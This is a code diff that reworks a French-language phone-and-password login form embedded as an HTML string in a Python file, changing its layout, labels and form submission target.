@@ -83,12 +83,13 @@ HTML_INTERFACE = """
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Page de connéction</h2>
-        <form id="postForm">
-            <div class="form-group">
-                <label id="label-tel" name="username" for="phone">Numéro de téléphone :</label>
-                <input 
+    <div class="login-container">
+    <h2>Se connecter</h2>
+    <form action="/ma-page-de-traitement" method="POST">
+        
+        <div class="form-group">
+            <label id="label-tel" for="phone">Numéro de téléphone :</label>
+            <input 
                 type="tel" 
                 id="phone" 
                 name="phone" 
@@ -96,20 +97,24 @@ HTML_INTERFACE = """
                 pattern="[0-9]{8,15}" 
                 title="Veuillez entrer un numéro de téléphone valide (uniquement des chiffres, entre 8 et 15 caractères)." 
                 required>
-            </div>
-            <div class="form-group">
-                <label id="label-pass" for="password">Mot de passe :</label>
-                <input 
+        </div>
+
+        <div class="form-group">
+            <label id="label-pass" for="password">Mot de passe :</label>
+            <input 
                 type="password" 
                 id="password" 
                 name="password" 
                 placeholder="Votre mot de passe" 
                 required>
-            </div>
-            <button type="submit">Connéxion</button>
-        </form>
-        <div id="statusMessage" class="status"></div>
-    </div>
+        </div>
+
+        <button type="submit">Connexion</button>
+        
+    </form>
+</div>
+
+     
 
     <script>
         document.getElementById('postForm').addEventListener('submit', function(e) {
